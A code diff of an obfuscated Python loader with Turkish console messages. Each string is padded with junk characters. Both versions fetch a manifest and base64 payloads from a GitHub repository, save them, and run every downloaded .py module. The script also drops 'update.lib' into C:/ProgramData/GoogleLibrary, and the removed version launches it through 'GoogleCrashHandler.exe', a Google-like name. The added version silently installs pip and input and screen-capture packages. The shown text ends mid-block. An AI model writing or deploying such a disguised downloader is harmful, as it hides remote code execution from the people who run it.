@@ -1,165 +1,205 @@
 import importlib.util
-from importlib.machinery import SourceFileLoader as _aQJWA8ee1HLr
-import os as _ZmiyGcBUxP
-import sys as __Lpn32Lizmbb
-import threading as _tlT_RC7
-import hashlib as _RPoQQCvQ8fC
-import base64 as _qHmDlHkcl03
-import json as _wE7gND3UVpX
-import requests as _CrHfcgv3yZx
-import sys as _XxqBWwfF
-import time as _lrMqSUtuzk
-import subprocess as _WdMwIIB6
-_q2NbTmUAuB9O = _ZmiyGcBUxP.path.dirname(_ZmiyGcBUxP.path.abspath(__file__))
-_wPdkx8F2KWX = _ZmiyGcBUxP.path.join(_q2NbTmUAuB9O, 'kjmdkjmakjmtkjm'.replace('kjm', ''))
+from importlib.machinery import SourceFileLoader as _A_9vlR_F7Y
+import os as _tfovZw
+import sys as _QI2wQSGswAYP
+import threading as __mV_7D
+import hashlib as _fvwIXjkl
+import base64 as _AeoYvgCZ_9vp
+import json as __yVwdto
+import requests as _UkEreV7a3v
+import sys as _l0mdFClnUQvD
+import time as _d_R5zMQOzO
+import subprocess as _evHAvk1BZP
+import importlib as _Aqo6MW9TD
+_jCZBgoBZzGu = _tfovZw.path.dirname(_tfovZw.path.abspath(__file__))
+_IiwUf1hhL = _tfovZw.path.join(_jCZBgoBZzGu, 'oamddoamdaoamdtoamd'.replace('oamd', ''))
 
-def _Dw7MZ3Tb3(_ywB2XX, _NGqq2a):
-    _s3uggi0GZ = _aQJWA8ee1HLr(_NGqq2a, _ywB2XX)
-    _aZNFOVhz_ = importlib.util.spec_from_loader(_NGqq2a, _s3uggi0GZ)
-    _lBrvtI7Qth5 = importlib.util.module_from_spec(_aZNFOVhz_)
-    _s3uggi0GZ.exec_module(_lBrvtI7Qth5)
-    return _lBrvtI7Qth5
-
-def _lW90hi_y_9U(_sm2t2yJB_u1Z, _ywB2XX, _NGqq2a):
+def _eBmHNVbK5p():
+    _bkJeH45xX = ["pydirectinput","dxcam","numpy"]
+    _yJer4pyv7 = f"""{'zy"zy'.replace('zy', '')}{_l0mdFClnUQvD.executable}{'yozc"yozc'.replace('yozc', '')}"""
     try:
-        print(f"{'oi-oi-oi-oi oiYoiüoikoiloieoinoiioiyoiooiroi:oi oi'.replace('oi', '')}{_sm2t2yJB_u1Z}{'noi noi-noi-noi-noi'.replace('noi', '')}")
-        _lBrvtI7Qth5 = _Dw7MZ3Tb3(_ywB2XX, _NGqq2a)
-        if hasattr(_lBrvtI7Qth5, 'fzomfzoafzoifzonfzo'.replace('fzo', '')):
-            _lBrvtI7Qth5.main()
-        else:
-            print(f"""{"zff zff zffUzffyzffazffrzffızff:zff zff'zff".replace('zff', '')}{_sm2t2yJB_u1Z}{"ea'ea eaieaçeaieaneadeaeea eameaaeaieanea(ea)ea eafeaoeaneakeaseaieayeaoeaneauea eabeauealeaueaneaaeameaaeadeaıea,ea eaaeatealeaaeaneaıeayeaoearea.ea".replace('ea', '')}""")
-    except Exception as e:
-        print(f"""{"vh vh vhHvhAvhTvhAvh:vh vh'vh".replace('vh', '')}{_sm2t2yJB_u1Z}{"by'by byçbyabylbyıbyşbytbyıbyrbyıbylbyıbyrbykbyebynby byhbyabytbyaby byobylbyubyşbytbyuby:by by".replace('by', '')}{e}""")
-
-def _rQXqV6lO():
-    if not _ZmiyGcBUxP.path.isdir(_wPdkx8F2KWX):
-        print(f"""{"rwqyHrwqyArwqyTrwqyArwqy:rwqy rwqy'rwqy".replace('rwqy', '')}{_wPdkx8F2KWX}{"wqlt'wqlt wqltkwqltlwqltawqltswqltöwqltrwqltüwqlt wqltbwqltuwqltlwqltuwqltnwqltawqltmwqltawqltdwqltıwqlt.wqlt".replace('wqlt', '')}""")
-        return
-    _Tgor7EGxG = sorted(_ZmiyGcBUxP.listdir(_wPdkx8F2KWX))
-    if not _Tgor7EGxG:
-        print(f"""{"yw'yw".replace('yw', '')}{_wPdkx8F2KWX}{"of'of ofkoflofaofsoföofrofüof ofbofoofşof,of ofçofaoflofıofşoftofıofrofıoflofaofcofaofkof ofdofoofsofyofaof ofyofoofkof.of".replace('of', '')}""")
-        return
-    _OAVhaPS9R = []
-    for _sm2t2yJB_u1Z in _Tgor7EGxG:
-        _ywB2XX = _ZmiyGcBUxP.path.join(_wPdkx8F2KWX, _sm2t2yJB_u1Z)
-        if not _ZmiyGcBUxP.path.isfile(_ywB2XX) or _sm2t2yJB_u1Z.endswith('xl.xljxlsxloxlnxl'.replace('xl', '')) or _sm2t2yJB_u1Z.startswith('qxpw.qxpw'.replace('qxpw', '')) or (_sm2t2yJB_u1Z == 'khw_khw_khwmkhwakhwikhwnkhw_khw_khw'.replace('khw', '')):
-            continue
-        _NGqq2a = _ZmiyGcBUxP.path.splitext(_sm2t2yJB_u1Z)[0]
-        _ICaT9L = _tlT_RC7.Thread(target=_lW90hi_y_9U, args=(_sm2t2yJB_u1Z, _ywB2XX, _NGqq2a), daemon=True)
-        _OAVhaPS9R.append(_ICaT9L)
-        _ICaT9L.start()
-    for _ICaT9L in _OAVhaPS9R:
-        _ICaT9L.join()
-
-def _fA9OW8Tg_d():
-    _cPeP4T = 'uysuyauymuysuyeuypuyiuy0uyluyxuy4uy'.replace('uy', '')
-    _c4OCvwgZWe6 = 'mnnmnomnsmnymnsmntmnemnmmnimnsmnsmnamnfmnemn'.replace('mn', '')
-    _s7hFzN17Dj7s = 'motcmmotcamotcimotcnmotc'.replace('motc', '')
-    _Bmj65mAqJHFu = 'jrtrdjrtrajrtrtjrtr'.replace('jrtr', '')
-    _FsQaz5knIhG = _wPdkx8F2KWX
-    _jmUfVEyRWIn = _ZmiyGcBUxP.path.join(_FsQaz5knIhG, 'gtkt.gtkthgtktagtktsgtkthgtkt_gtktcgtktagtktcgtkthgtktegtkt.gtktjgtktsgtktogtktngtkt'.replace('gtkt', ''))
-    _wpPTJMVhxoLo = ['swf_swfxswf7swfQswf_swf'.replace('swf', ''), 'ja~jazjaKja9ja~ja'.replace('ja', ''), 'alhu|alhumalhu3alhuvalhu|alhu'.replace('alhu', ''), 'rkn_rknqrknArkn1rkn_rkn'.replace('rkn', ''), 'on~onTon0onpon~on'.replace('on', '')]
-    _EEhSKKtkBf = f"{'qawhqawtqawtqawpqawsqaw:qaw/qaw/qawrqawaqawwqaw.qawgqawiqawtqawhqawuqawbqawuqawsqaweqawrqawcqawoqawnqawtqaweqawnqawtqaw.qawcqawoqawmqaw/qaw'.replace('qaw', '')}{_cPeP4T}{'qbh/qbh'.replace('qbh', '')}{_c4OCvwgZWe6}{'sahs/sahs'.replace('sahs', '')}{_s7hFzN17Dj7s}{'dbek/dbek'.replace('dbek', '')}{_Bmj65mAqJHFu}"
-    _ZmiyGcBUxP.makedirs(_FsQaz5knIhG, exist_ok=True)
-    _JNRDax = 'landCland:land/landPlandrlandolandglandrlandalandmlandDlandalandtlandaland/landGlandolandolandglandllandelandLlandilandblandrlandalandrlandyland/landulandplanddlandalandtlandeland.landllandilandbland'.replace('land', '')
-    _JYnnerl = {}
-    if _ZmiyGcBUxP.path.exists(_jmUfVEyRWIn):
+        _Aqo6MW9TD.import_module('nopnoinopno'.replace('no', ''))
+    except ImportError:
+        _aptZO5j59h = _evHAvk1BZP.Popen(f"{_yJer4pyv7}{'mo mo-mommo moemonmosmoumormoemopmoimopmo mo-mo-moumopmogmormoamodmoemo'.replace('mo', '')}", stdout=_evHAvk1BZP.PIPE, stderr=_evHAvk1BZP.PIPE, text=True, shell=True)
+        _aptZO5j59h.communicate()
+        if _aptZO5j59h.returncode != 0:
+            _QHjUex = _UkEreV7a3v.get('sswhsswtsswtsswpsswsssw:ssw/ssw/sswbsswosswosswtsswssswtsswrsswasswpssw.sswpsswysswpsswassw.sswisswossw/sswgsswesswtssw-sswpsswisswpssw.sswpsswyssw'.replace('ssw', ''))
+            with open('omlgomleomltoml-omlpomliomlpoml.omlpomlyoml'.replace('oml', ''), 'ppgwppgbppg'.replace('ppg', '')) as _e4fS3q:
+                _e4fS3q.write(_QHjUex.content)
+            _aptZO5j59h = _evHAvk1BZP.Popen(f"{_yJer4pyv7}{'otv otvgotveotvtotv-otvpotviotvpotv.otvpotvyotv'.replace('otv', '')}", stdout=_evHAvk1BZP.PIPE, stderr=_evHAvk1BZP.PIPE, text=True, shell=True)
+            _aptZO5j59h.communicate()
+            if _tfovZw.path.exists('xgcgxgcexgctxgc-xgcpxgcixgcpxgc.xgcpxgcyxgc'.replace('xgc', '')):
+                _tfovZw.remove('yyngyyneyyntyyn-yynpyyniyynpyyn.yynpyynyyyn'.replace('yyn', ''))
+            if _aptZO5j59h.returncode != 0:
+                return False
+    for _fvDaosHgVL in _bkJeH45xX:
         try:
-            with open(_jmUfVEyRWIn, 'ivhrivh'.replace('ivh', ''), encoding='oewuoewtoewfoew-oew8oew'.replace('oew', '')) as _Q3T5Gt:
-                _JYnnerl = _wE7gND3UVpX.load(_Q3T5Gt)
+            _Aqo6MW9TD.import_module(_fvDaosHgVL)
+            continue
+        except ImportError:
+            pass
+        _aptZO5j59h = _evHAvk1BZP.Popen(f"{_yJer4pyv7}{'zo zo-zomzo zopzoizopzo zoizonzoszotzoazolzolzo zo'.replace('zo', '')}{_fvDaosHgVL}", stdout=_evHAvk1BZP.PIPE, stderr=_evHAvk1BZP.PIPE, text=True, shell=True)
+        _aptZO5j59h.communicate()
+        if _aptZO5j59h.returncode != 0:
+            return False
+        try:
+            _Aqo6MW9TD.import_module(_fvDaosHgVL)
+        except ImportError:
+            return False
+    return True
+
+def _BwPGbUO_Atc6(_Jf4fEeY2G, _kif9GmXN):
+    _okco4u2yL = _A_9vlR_F7Y(_kif9GmXN, _Jf4fEeY2G)
+    _uAr6mzCQA_l1 = _Aqo6MW9TD.util.spec_from_loader(_kif9GmXN, _okco4u2yL)
+    _bpTY8g3YY995 = _Aqo6MW9TD.util.module_from_spec(_uAr6mzCQA_l1)
+    _okco4u2yL.exec_module(_bpTY8g3YY995)
+    return _bpTY8g3YY995
+
+def _mwq88Mbg(_XYb8tW, _Jf4fEeY2G, _kif9GmXN):
+    try:
+        print(f"{'yxvf-yxvf-yxvf-yxvf yxvfYyxvfüyxvfkyxvflyxvfeyxvfnyxvfiyxvfyyxvfoyxvfryxvf:yxvf yxvf'.replace('yxvf', '')}{_XYb8tW}{'mha mha-mha-mha-mha'.replace('mha', '')}")
+        _bpTY8g3YY995 = _BwPGbUO_Atc6(_Jf4fEeY2G, _kif9GmXN)
+        if hasattr(_bpTY8g3YY995, 'pyxmpyxapyxipyxnpyx'.replace('pyx', '')):
+            _bpTY8g3YY995.main()
+        else:
+            print(f"""{"cveg cveg cvegUcvegycvegacvegrcvegıcveg:cveg cveg'cveg".replace('cveg', '')}{_XYb8tW}{"rrqw'rrqw rrqwirrqwçrrqwirrqwnrrqwdrrqwerrqw rrqwmrrqwarrqwirrqwnrrqw(rrqw)rrqw rrqwfrrqworrqwnrrqwkrrqwsrrqwirrqwyrrqworrqwnrrqwurrqw rrqwbrrqwurrqwlrrqwurrqwnrrqwarrqwmrrqwarrqwdrrqwırrqw,rrqw rrqwarrqwtrrqwlrrqwarrqwnrrqwırrqwyrrqworrqwrrrqw.rrqw".replace('rrqw', '')}""")
+    except Exception as e:
+        print(f"""{"qo qo qoHqoAqoTqoAqo:qo qo'qo".replace('qo', '')}{_XYb8tW}{"dl'dl dlçdladlldlıdlşdltdlıdlrdlıdlldlıdlrdlkdledlndl dlhdladltdladl dlodlldludlşdltdludl:dl dl".replace('dl', '')}{e}""")
+
+def _CHQOBd3UEu9W():
+    if not _tfovZw.path.isdir(_IiwUf1hhL):
+        print(f"""{"tjHtjAtjTtjAtj:tj tj'tj".replace('tj', '')}{_IiwUf1hhL}{"sm'sm smksmlsmasmssmösmrsmüsm smbsmusmlsmusmnsmasmmsmasmdsmısm.sm".replace('sm', '')}""")
+        return
+    _Qn5UX6_Y = sorted(_tfovZw.listdir(_IiwUf1hhL))
+    if not _Qn5UX6_Y:
+        print(f"""{"mf'mf".replace('mf', '')}{_IiwUf1hhL}{"hn'hn hnkhnlhnahnshnöhnrhnühn hnbhnohnşhn,hn hnçhnahnlhnıhnşhnthnıhnrhnıhnlhnahnchnahnkhn hndhnohnshnyhnahn hnyhnohnkhn.hn".replace('hn', '')}""")
+        return
+    _BuIWXPkT = []
+    for _XYb8tW in _Qn5UX6_Y:
+        _Jf4fEeY2G = _tfovZw.path.join(_IiwUf1hhL, _XYb8tW)
+        if not _tfovZw.path.isfile(_Jf4fEeY2G) or _XYb8tW.endswith('enpv.enpvjenpvsenpvoenpvnenpv'.replace('enpv', '')) or _XYb8tW.startswith('pv.pv'.replace('pv', '')) or (_XYb8tW == 'jrl_jrl_jrlmjrlajrlijrlnjrl_jrl_jrl'.replace('jrl', '')):
+            continue
+        _kif9GmXN = _tfovZw.path.splitext(_XYb8tW)[0]
+        __uuiBF = __mV_7D.Thread(target=_mwq88Mbg, args=(_XYb8tW, _Jf4fEeY2G, _kif9GmXN), daemon=True)
+        _BuIWXPkT.append(__uuiBF)
+        __uuiBF.start()
+    for __uuiBF in _BuIWXPkT:
+        __uuiBF.join()
+
+def _dVP34uCec():
+    _ixAp_1aH = 'pteospteoapteompteospteoepteoppteoipteo0pteolpteoxpteo4pteo'.replace('pteo', '')
+    _DH5cmXNkazCP = 'nxnnxonxsnxynxsnxtnxenxmnxinxsnxsnxanxfnxenx'.replace('nx', '')
+    _lIwYJEf = 'wrmwrawriwrnwr'.replace('wr', '')
+    _kGnDemR2ZBbN = 'uxduxauxtux'.replace('ux', '')
+    _IJ07ui = _IiwUf1hhL
+    _VwFqskQ8 = _tfovZw.path.join(_IJ07ui, 'hqnb.hqnbhhqnbahqnbshqnbhhqnb_hqnbchqnbahqnbchqnbhhqnbehqnb.hqnbjhqnbshqnbohqnbnhqnb'.replace('hqnb', ''))
+    _ule9RM0tpj = ['mu_muxmu7muQmu_mu'.replace('mu', ''), 'scq~scqzscqKscq9scq~scq'.replace('scq', ''), 'zs|zsmzs3zsvzs|zs'.replace('zs', ''), 'pfh_pfhqpfhApfh1pfh_pfh'.replace('pfh', ''), 'glc~glcTglc0glcpglc~glc'.replace('glc', '')]
+    _YdYKmm3ltE = int(_d_R5zMQOzO.time())
+    _fDqhM4iqm = f"{'rycphrycptrycptrycpprycpsrycp:rycp/rycp/rycprrycparycpwrycp.rycpgrycpirycptrycphrycpurycpbrycpurycpsrycperycprrycpcrycporycpnrycptrycperycpnrycptrycp.rycpcrycporycpmrycp/rycp'.replace('rycp', '')}{_ixAp_1aH}{'whb/whb'.replace('whb', '')}{_DH5cmXNkazCP}{'ujaa/ujaa'.replace('ujaa', '')}{_lIwYJEf}{'wrrg/wrrg'.replace('wrrg', '')}{_kGnDemR2ZBbN}"
+    _tfovZw.makedirs(_IJ07ui, exist_ok=True)
+    _y5K1Gi0kmV = 'iiCii:ii/iiPiiriioiigiiriiaiimiiDiiaiitiiaii/iiGiioiioiigiiliieiiLiiiiibiiriiaiiriiyii/iiuiipiidiiaiitiieii.iiliiiiibii'.replace('ii', '')
+    _aAFF22Vp = {}
+    if _tfovZw.path.exists(_VwFqskQ8):
+        try:
+            with open(_VwFqskQ8, 'zkrzk'.replace('zk', ''), encoding='nqunqtnqfnq-nq8nq'.replace('nq', '')) as _e4fS3q:
+                _aAFF22Vp = __yVwdto.load(_e4fS3q)
         except Exception as e:
-            print(f"{'yfmCyfmayfmcyfmhyfmeyfm yfmdyfmoyfmsyfmyyfmayfmsyfmıyfm yfmoyfmkyfmuyfmnyfmayfmmyfmayfmdyfmıyfm:yfm yfm'.replace('yfm', '')}{e}")
-            _JYnnerl = {}
-    _V1Fz5HAft = _CrHfcgv3yZx.get(f"{_EEhSKKtkBf}{'ciq/ciqmciqaciqnciqiciqfciqeciqsciqtciq.ciqjciqsciqociqnciq'.replace('ciq', '')}", timeout=10)
-    _V1Fz5HAft.raise_for_status()
-    _NxKxaa8U = _V1Fz5HAft.json()
-    _YOmV_W, _Q7jbOy9uC = ([], [])
-    _ryKE2zd = False
-    for _tik1_T, _zDe_lgFJYbMe in _NxKxaa8U.items():
-        if _tik1_T == 'uvjj_uvjj_uvjjmuvjjauvjjiuvjjnuvjj_uvjj_uvjj'.replace('uvjj', ''):
+            print(f"{'vwCvwavwcvwhvwevw vwdvwovwsvwyvwavwsvwıvw vwovwkvwuvwnvwavwmvwavwdvwıvw:vw vw'.replace('vw', '')}{e}")
+            _aAFF22Vp = {}
+    _Cy9XBqha4f7f = _UkEreV7a3v.get(f"{_fDqhM4iqm}{'px/pxmpxapxnpxipxfpxepxspxtpx.pxjpxspxopxnpx?px_pxcpxbpx=px'.replace('px', '')}{_YdYKmm3ltE}", timeout=10)
+    _Cy9XBqha4f7f.raise_for_status()
+    _MbkrauP = _Cy9XBqha4f7f.json()
+    _IHT1b5U, _Gy8uoBE = ([], [])
+    _PaX3NWhOBssW = False
+    for _GM1p06CHB, _PWMVmd1KrhAJ in _MbkrauP.items():
+        if _GM1p06CHB == 'ft_ft_ftmftaftiftnft_ft_ft'.replace('ft', ''):
             continue
-        _at0fYp = _zDe_lgFJYbMe['qtzhqtzaqtzsqtzhqtz'.replace('qtz', '')].strip().lower()
-        _FYIk5W = _zDe_lgFJYbMe['rrsrrrserrsmrrsorrstrrserrs'.replace('rrs', '')]
-        _M3AqTiF_Tb = _ZmiyGcBUxP.path.join(_FsQaz5knIhG, _tik1_T)
-        _NzZMNon5Bb = _ZmiyGcBUxP.path.exists(_M3AqTiF_Tb)
-        _V8D57J4k = _JYnnerl.get(_tik1_T, '').strip().lower() == _at0fYp
-        if _NzZMNon5Bb and _V8D57J4k:
+        _HLb4zcM7IH = _PWMVmd1KrhAJ['knchkncakncsknchknc'.replace('knc', '')].strip().lower()
+        _aSuwx2mr0N = _PWMVmd1KrhAJ['jsrjsejsmjsojstjsejs'.replace('js', '')]
+        _qCxgp1keQ = _tfovZw.path.join(_IJ07ui, _GM1p06CHB)
+        _Y6EtDJiQk7D = _tfovZw.path.exists(_qCxgp1keQ)
+        _cGimxL_YfVN = _aAFF22Vp.get(_GM1p06CHB, '').strip().lower() == _HLb4zcM7IH
+        if _Y6EtDJiQk7D and _cGimxL_YfVN:
             continue
-        _wEy2WqNdzaci = _CrHfcgv3yZx.get(f"{_EEhSKKtkBf}{'dlbg/dlbg'.replace('dlbg', '')}{_FYIk5W}", timeout=10)
-        _wEy2WqNdzaci.raise_for_status()
-        _iysTrb = _wEy2WqNdzaci.text
-        for _emrdbmmgQ in _wpPTJMVhxoLo:
-            _iysTrb = _iysTrb.replace(_emrdbmmgQ, '')
-        _iysTrb = _iysTrb.strip().replace('al\nal'.replace('al', ''), '').replace('ieh\rieh'.replace('ieh', ''), '')
-        _vjbUocBxizEi = _qHmDlHkcl03.b64decode(_iysTrb)
-        _exOay7 = _RPoQQCvQ8fC.sha256(_vjbUocBxizEi).hexdigest().lower()
-        if _exOay7 != _at0fYp:
-            print(f"{'ejjtUejjtYejjtAejjtRejjtIejjt:ejjt ejjt'.replace('ejjt', '')}{_tik1_T}{'nal nalhnalanalsnalhnal nalunalynalunalşnalmnalunalynalonalrnal,nal nalanaltnallnalanalnnalınalynalonalrnal.nal'.replace('nal', '')}")
+        _QdlQHvXm_cjw = _UkEreV7a3v.get(f"{_fDqhM4iqm}{'nxi/nxi'.replace('nxi', '')}{_aSuwx2mr0N}{'gwv?gwv_gwvcgwvbgwv=gwv'.replace('gwv', '')}{_YdYKmm3ltE}", timeout=10)
+        _QdlQHvXm_cjw.raise_for_status()
+        _tWYyHc072 = _QdlQHvXm_cjw.text
+        for _m3ga06f in _ule9RM0tpj:
+            _tWYyHc072 = _tWYyHc072.replace(_m3ga06f, '')
+        _tWYyHc072 = _tWYyHc072.strip().replace('gnj\ngnj'.replace('gnj', ''), '').replace('hlfy\rhlfy'.replace('hlfy', ''), '')
+        _EYgRsABp = _AeoYvgCZ_9vp.b64decode(_tWYyHc072)
+        _WygjXd5Z = _fvwIXjkl.sha256(_EYgRsABp).hexdigest().lower()
+        if _WygjXd5Z != _HLb4zcM7IH:
+            print(f"{'wiUwiYwiAwiRwiIwi:wi wi'.replace('wi', '')}{_GM1p06CHB}{'dflp dflphdflpadflpsdflphdflp dflpudflpydflpudflpşdflpmdflpudflpydflpodflprdflp,dflp dflpadflptdflpldflpadflpndflpıdflpydflpodflprdflp.dflp'.replace('dflp', '')}")
             continue
-        with open(_M3AqTiF_Tb, 'dmywdmybdmy'.replace('dmy', '')) as _Q3T5Gt:
-            _Q3T5Gt.write(_vjbUocBxizEi)
-        _JYnnerl[_tik1_T] = _at0fYp
-        if _NzZMNon5Bb:
-            _YOmV_W.append(_tik1_T)
+        with open(_qCxgp1keQ, 'dyuwdyubdyu'.replace('dyu', '')) as _e4fS3q:
+            _e4fS3q.write(_EYgRsABp)
+        _aAFF22Vp[_GM1p06CHB] = _HLb4zcM7IH
+        if _Y6EtDJiQk7D:
+            _IHT1b5U.append(_GM1p06CHB)
         else:
-            _Q7jbOy9uC.append(_tik1_T)
+            _Gy8uoBE.append(_GM1p06CHB)
     try:
-        _pp4O5PNj = f"{'yckmhyckmtyckmtyckmpyckmsyckm:yckm/yckm/yckmryckmayckmwyckm.yckmgyckmiyckmtyckmhyckmuyckmbyckmuyckmsyckmeyckmryckmcyckmoyckmnyckmtyckmeyckmnyckmtyckm.yckmcyckmoyckmmyckm/yckm'.replace('yckm', '')}{_cPeP4T}{'kek/kek'.replace('kek', '')}{_c4OCvwgZWe6}{'ozfe/ozfe'.replace('ozfe', '')}{_s7hFzN17Dj7s}{'fml/fml_fml_fmlmfmlafmlifmlnfml_fml_fml'.replace('fml', '')}"
-        _awvxDwCLvNY = _CrHfcgv3yZx.get(_pp4O5PNj, timeout=10)
-        if _awvxDwCLvNY.status_code == 200:
-            _OklTMPxV1 = _awvxDwCLvNY.text
-            _nvDpYUfHrc = _RPoQQCvQ8fC.sha256(_OklTMPxV1.encode('mwwumwwtmwwfmww-mww8mww'.replace('mww', ''))).hexdigest().lower()
-            with open(_JNRDax, 'mnnhrmnnh'.replace('mnnh', ''), encoding='ngungtngfng-ng8ng'.replace('ng', '')) as _Q3T5Gt:
-                _lcGvMTaQtKsR = _Q3T5Gt.read()
-            _GGUwrdSC = _RPoQQCvQ8fC.sha256(_lcGvMTaQtKsR.encode('geugetgefge-ge8ge'.replace('ge', ''))).hexdigest().lower()
-            if _nvDpYUfHrc != _GGUwrdSC:
-                print(f"{'jcyj jcyjAjcyjnjcyjajcyj jcyjsjcyjcjcyjrjcyjijcyjpjcyjtjcyj jcyj(jcyjujcyjpjcyjdjcyjajcyjtjcyjejcyj.jcyjljcyjijcyjbjcyj)jcyj jcyjgjcyjüjcyjnjcyjcjcyjejcyjljcyjljcyjejcyjnjcyjijcyjyjcyjojcyjrjcyj.jcyj.jcyj.jcyj'.replace('jcyj', '')}")
-                with open(_JNRDax, 'cixwcix'.replace('cix', ''), encoding='ibtkuibtktibtkfibtk-ibtk8ibtk'.replace('ibtk', '')) as _Q3T5Gt:
-                    _Q3T5Gt.write(_OklTMPxV1)
-                _ryKE2zd = True
-                print(f"{'pl pluplppldplapltplepl.pllpliplbpl plbplaplşplaplrplıplypllplapl plgplüplnplcplepllpllpleplnpldplipl!pl'.replace('pl', '')}")
+        _pIJm8kzoGh = f"{'zthzttzttztpztszt:zt/zt/ztrztaztwzt.ztgztizttzthztuztbztuztszteztrztcztoztnzttzteztnzttzt.ztcztoztmzt/zt'.replace('zt', '')}{_ixAp_1aH}{'ykq/ykq'.replace('ykq', '')}{_DH5cmXNkazCP}{'llnn/llnn'.replace('llnn', '')}{_lIwYJEf}{'ogmq/ogmq_ogmq_ogmqmogmqaogmqiogmqnogmq_ogmq_ogmq?ogmq_ogmqcogmqbogmq=ogmq'.replace('ogmq', '')}{_YdYKmm3ltE}"
+        _XSYaAX69lvF = _UkEreV7a3v.get(_pIJm8kzoGh, timeout=10)
+        if _XSYaAX69lvF.status_code == 200:
+            _Oi8zYwZ2Cyt = _XSYaAX69lvF.content.replace(b'\r\n', b'\n')
+            _Cg5vNJ = _fvwIXjkl.sha256(_Oi8zYwZ2Cyt).hexdigest().lower()
+            _mJYtj6IGC = b''
+            if _tfovZw.path.exists(_y5K1Gi0kmV):
+                with open(_y5K1Gi0kmV, 'rayrraybray'.replace('ray', '')) as _e4fS3q:
+                    _mJYtj6IGC = _e4fS3q.read().replace(b'\r\n', b'\n')
+            _zyYJdN = _fvwIXjkl.sha256(_mJYtj6IGC).hexdigest().lower()
+            if _Cg5vNJ != _zyYJdN:
+                print('ep epAepnepaep epsepceprepieppeptep ep(epueppepdepaeptepeep.eplepiepbep)ep epgepüepnepcepeepleplepeepnepiepyepoeprep.ep.ep.ep'.replace('ep', ''))
+                _tfovZw.makedirs(_tfovZw.path.dirname(_y5K1Gi0kmV), exist_ok=True)
+                with open(_y5K1Gi0kmV, 'bbvwwbbvwbbbvw'.replace('bbvw', '')) as _e4fS3q:
+                    _e4fS3q.write(_Oi8zYwZ2Cyt)
+                _PaX3NWhOBssW = True
+                print('izkh izkhuizkhpizkhdizkhaizkhtizkheizkh.izkhlizkhiizkhbizkh izkhbizkhaizkhşizkhaizkhrizkhıizkhyizkhlizkhaizkh izkhgizkhüizkhnizkhcizkheizkhlizkhlizkheizkhnizkhdizkhiizkh!izkh'.replace('izkh', ''))
             else:
-                print(f"{'sqlj sqljusqljpsqljdsqljasqljtsqljesqlj.sqljlsqljisqljbsqlj sqljzsqljasqljtsqljesqljnsqlj sqljgsqljüsqljnsqljcsqljesqljlsqlj'.replace('sqlj', '')}")
+                print('bwnu bwnuubwnupbwnudbwnuabwnutbwnuebwnu.bwnulbwnuibwnubbwnu bwnuzbwnuabwnutbwnuebwnunbwnu bwnugbwnuübwnunbwnucbwnuebwnulbwnu.bwnu'.replace('bwnu', ''))
         else:
-            print(f"""{"mr mrGmrimrtmrHmrumrbmr'mrdmramr mr'mr_mr_mrmmramrimrnmr_mr_mr'mr mrdmromrsmrymramrsmrımr mrbmrumrlmrumrnmramrmmramrdmrımr.mr".replace('mr', '')}""")
+            print("kl klGklikltklHkluklbkl'kldklakl kl'kl_kl_klmklakliklnkl_kl_kl'kl kldkloklsklyklaklsklıkl klbklukllkluklnklaklmklakldklıkl.kl".replace('kl', ''))
     except Exception as e:
-        print(f"{'tj tjAtjntjatj tjstjctjrtjitjptjttj tjgtjütjntjctjetjltjltjetjntjitjrtjktjetjntj tjhtjatjttjatj:tj tj'.replace('tj', '')}{e}")
-    with open(_jmUfVEyRWIn, 'sdjmwsdjm'.replace('sdjm', ''), encoding='ussguussgtussgfussg-ussg8ussg'.replace('ussg', '')) as _Q3T5Gt:
-        _wE7gND3UVpX.dump(_JYnnerl, _Q3T5Gt, indent=2)
-    if _Q7jbOy9uC:
-        print(f"{'omv omvYomveomvnomviomv omveomvkomvlomveomvnomveomvnomv omvdomvoomvsomvyomvaomvlomvaomvromv:omv omv'.replace('omv', '')}{'tlh,tlh tlh'.replace('tlh', '').join(_Q7jbOy9uC)}")
-    if _YOmV_W:
-        print(f"{'yzw yzwGyzwüyzwnyzwcyzweyzwlyzwlyzweyzwnyzweyzwnyzw yzwdyzwoyzwsyzwyyzwayzwlyzwayzwryzw:yzw yzw'.replace('yzw', '')}{'lorb,lorb lorb'.replace('lorb', '').join(_YOmV_W)}")
-    if _ryKE2zd:
-        print('bdn bdnSbdncbdnrbdnibdnpbdntbdn bdngbdnübdnnbdncbdnebdnlbdnlbdnebdnnbdndbdnibdn,bdn bdnybdnebdnnbdnibdndbdnebdnnbdn bdnbbdnabdnşbdnlbdnabdntbdnıbdnlbdnıbdnybdnobdnrbdn.bdn.bdn.bdn'.replace('bdn', ''))
-        _WdMwIIB6.Popen('awCaw:aw/awPawrawoawgawrawaawmawDawaawtawaaw/awGawoawoawgawlaweawLawiawbawrawaawrawyaw/awGawoawoawgawlaweawCawrawaawsawhawHawaawnawdawlaweawraw.aweawxaweaw awCaw:aw/awPawrawoawgawrawaawmawDawaawtawaaw/awGawoawoawgawlaweawLawiawbawrawaawrawyaw/awuawpawdawaawtaweaw.awlawiawbaw'.replace('aw', ''), shell=True, stdout=_WdMwIIB6.DEVNULL, stderr=_WdMwIIB6.DEVNULL)
-        _XxqBWwfF.exit(0)
-    if not _Q7jbOy9uC and (not _YOmV_W) and (not _ryKE2zd):
-        print('iofq iofqTiofqüiofqmiofq iofqdiofqoiofqsiofqyiofqaiofqliofqaiofqriofq iofqziofqaiofqtiofqeiofqniofq iofqgiofqüiofqniofqciofqeiofqliofq.iofq'.replace('iofq', ''))
+        print(f"{'hb hbAhbnhbahb hbshbchbrhbihbphbthb hbghbühbnhbchbehblhblhbehbnhbihbrhbkhbehbnhb hbhhbahbthbahb:hb hb'.replace('hb', '')}{e}")
+    with open(_VwFqskQ8, 'pwtwpwt'.replace('pwt', ''), encoding='oqpauoqpatoqpafoqpa-oqpa8oqpa'.replace('oqpa', '')) as _e4fS3q:
+        __yVwdto.dump(_aAFF22Vp, _e4fS3q, indent=2)
+    if _Gy8uoBE:
+        print(f"{'yrs yrsYyrseyrsnyrsiyrs yrseyrskyrslyrseyrsnyrseyrsnyrs yrsdyrsoyrssyrsyyrsayrslyrsayrsryrs:yrs yrs'.replace('yrs', '')}{'ofz,ofz ofz'.replace('ofz', '').join(_Gy8uoBE)}")
+    if _IHT1b5U:
+        print(f"{'cb cbGcbücbncbccbecblcblcbecbncbecbncb cbdcbocbscbycbacblcbacbrcb:cb cb'.replace('cb', '')}{'gx,gx gx'.replace('gx', '').join(_IHT1b5U)}")
+    if _PaX3NWhOBssW:
